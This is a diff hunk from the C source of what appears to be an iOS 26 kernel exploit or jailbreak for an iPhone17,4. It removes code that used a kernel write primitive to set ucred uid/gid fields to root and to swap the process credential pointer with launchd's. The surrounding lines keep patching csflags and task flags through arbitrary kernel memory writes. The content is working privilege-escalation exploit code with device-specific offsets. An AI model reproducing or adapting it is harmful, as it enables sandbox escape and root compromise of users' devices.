@@ -499,47 +499,10 @@ static int prepareIOKitAccess(void) {
 
     kernel_logf("prepareIOKitAccess: proc csflags patched");
 
+    // Skip mutable cred writes on iPhone17,4/iOS 26: they are not reliable with the current
+    // 32-byte write primitive and do not improve the verified csflags/task path.
     bool hadNonCriticalFailures = false;
-
-    bool uidPairOk = kwrite64_retry(ucred + 0x18, 0, 8);
-    bool ruidPairOk = kwrite64_retry(ucred + 0x20, 0, 8);
-
-    // Patch uid/gid pairs with aligned 64-bit writes for better primitive reliability.
-    if (!uidPairOk) {
-        kernel_logf("prepareIOKitAccess: cr_uid/cr_gid pair verify failed (non-critical)");
-        hadNonCriticalFailures = true;
-    }
-    if (!ruidPairOk) {
-        kernel_logf("prepareIOKitAccess: cr_ruid/cr_rgid pair verify failed (non-critical)");
-        hadNonCriticalFailures = true;
-    }
-
-    if ((!uidPairOk || !ruidPairOk) && selfProcRoUcredSlot) {
-        uint64_t launchdProc = procbypid(1);
-        uint64_t launchdUcred = find_ucred_from_proc_ro_with_slot(launchdProc, NULL);
-        uint64_t selfProcRo = normalize_kernel_ptr(ds_kread64(self + PROC_PROC_RO_OFFSET));
-
-        if (is_kptr(selfProcRo) && is_kptr(launchdUcred)) {
-            if (kwrite64_retry(selfProcRo + selfProcRoUcredSlot, launchdUcred, 4)) {
-                kernel_logf("prepareIOKitAccess: swapped proc_ro ucred pointer with launchd ucred");
-                uidPairOk = true;
-                ruidPairOk = true;
-            } else {
-                kernel_logf("prepareIOKitAccess: proc_ro ucred swap failed (non-critical)");
-            }
-        }
-    }
-
-    if (uidPairOk && ruidPairOk) {
-        kernel_logf("prepareIOKitAccess: ucred uid/gid fields patched to root");
-    } else {
-        hadNonCriticalFailures = true;
-    }
-
-    // Do not write to cr_label (ucred+0x78) here: the current kwrite primitive can perform
-    // a 32-byte operation and overflow the 144-byte cred zone object boundary on iOS 26.
-    // sbx_escape already handles sandbox extension patching, so skipping this write is safer.
-    kernel_logf("prepareIOKitAccess: skipping cr_label write to avoid cred zone overflow");
+    kernel_logf("prepareIOKitAccess: skipping ucred mutations on this device");
 
     uint32_t tfOff = find_task_flags_offset(task);
     if (tfOff) {
